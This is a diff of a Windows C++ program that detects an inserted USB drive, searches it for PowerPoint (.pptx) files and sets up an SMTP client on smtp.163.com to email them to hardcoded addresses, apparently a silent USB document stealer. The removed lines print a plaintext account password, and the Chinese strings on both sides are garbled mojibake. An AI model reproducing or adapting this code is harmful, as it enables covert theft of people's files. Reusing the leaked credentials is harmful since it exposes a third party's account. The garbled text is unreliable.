@@ -22,11 +22,11 @@ int APIENTRY WinMain(HINSTANCE hInstance,
 {
 	if(!getUDisk())
 		return -1;
-	CSmtp smtp(25,"smtp.163.com","13618688056@163.com","19981113qsgnep","13618688056@163.com",
-			"Äã´ó¸çÀ´ĞÅ","");
+	CSmtp smtp(25,"smtp.163.com","13618688056@163.com","å¯†ç ","13618688056@163.com",
+			"ä½ å¤§å“¥æ¥ä¿¡","");
 
-	//CSmtp smtpfilelist(25,"smtp.163.com","13618688056@163.com","19981113qsgnep","137764477@qq.com",
-	//		"ÎÄ¼şÁĞ±í"," ");
+	//CSmtp smtpfilelist(25,"smtp.163.com","13618688056@163.com","å¯†ç ","137764477@qq.com",
+	//		"æ–‡ä»¶åˆ—è¡¨"," ");
 	//MyFindFile(diskPath,"ppt");
 	MyFindFile(diskPath,"pptx");
 	vector<string>::iterator it = file.begin();
@@ -59,15 +59,15 @@ int APIENTRY WinMain(HINSTANCE hInstance,
 	{
 		/*
 		if (err == -1)    
-            cout << "´íÎó-1: Ã»ÓĞÄ¿µØÓÊÏäµØÖ·!" << endl;    
+            cout << "é”™è¯¯-1: æ²¡æœ‰ç›®åœ°é‚®ç®±åœ°å€!" << endl;    
         if (err == 1)    
-            cout << "´íÎó1: ÓÉÓÚÍøÂç²»³©Í¨£¬·¢ËÍÊ§°Ü!" << endl;    
+            cout << "é”™è¯¯1: ç”±äºç½‘ç»œä¸ç•…é€šï¼Œå‘é€å¤±è´¥!" << endl;    
         if (err == 2)    
-            cout << "´íÎó2: ÓÃ»§Ãû´íÎó,ÇëºË¶Ô!" << endl;    
+            cout << "é”™è¯¯2: ç”¨æˆ·åé”™è¯¯,è¯·æ ¸å¯¹!" << endl;    
         if (err == 3)    
-            cout << "´íÎó3: ÓÃ»§ÃÜÂë´íÎó£¬ÇëºË¶Ô!" << endl;    
+            cout << "é”™è¯¯3: ç”¨æˆ·å¯†ç é”™è¯¯ï¼Œè¯·æ ¸å¯¹!" << endl;    
         if (err == 4)    
-            cout << "´íÎó4: Çë¼ì²é¸½¼şÄ¿Â¼ÊÇ·ñÕıÈ·£¬ÒÔ¼°ÎÄ¼şÊÇ·ñ´æÔÚ!" << endl;
+            cout << "é”™è¯¯4: è¯·æ£€æŸ¥é™„ä»¶ç›®å½•æ˜¯å¦æ­£ç¡®ï¼Œä»¥åŠæ–‡ä»¶æ˜¯å¦å­˜åœ¨!" << endl;
 			*/
 		return -1;
 	}
@@ -110,7 +110,7 @@ bool getUDisk()
 		if (allDisk!=0)
 		{
 			
-			for (int i=0;i<24;i++)     //¼Ù¶¨×î¶àÓĞ10¸ö´ÅÅÌ
+			for (int i=0;i<24;i++)     //å‡å®šæœ€å¤šæœ‰10ä¸ªç£ç›˜
 			{
 				if ((allDisk & 1)==1)
 				{
@@ -119,12 +119,12 @@ bool getUDisk()
 					
 					if ( GetDriveType(diskPath)==DRIVE_REMOVABLE )
 					{
-						//AfxMessageBox( "¼ì²âµ½UÅÌ", MB_OK );
+						//AfxMessageBox( "æ£€æµ‹åˆ°Uç›˜", MB_OK );
 						//AfxMessageBox( diskPath, MB_OK );
 						
-						if( GetVolumeInformation(diskPath,0,0,0,0,0,0,0) ) //ÅĞ¶ÏÇı¶¯ÊÇ·ñ×¼±¸¾ÍĞ÷
+						if( GetVolumeInformation(diskPath,0,0,0,0,0,0,0) ) //åˆ¤æ–­é©±åŠ¨æ˜¯å¦å‡†å¤‡å°±ç»ª
 						{
-							//printf("UÅÌ×¼±¸¾ÍĞ÷!");
+							//printf("Uç›˜å‡†å¤‡å°±ç»ª!");
 							
 							return true;
 						}
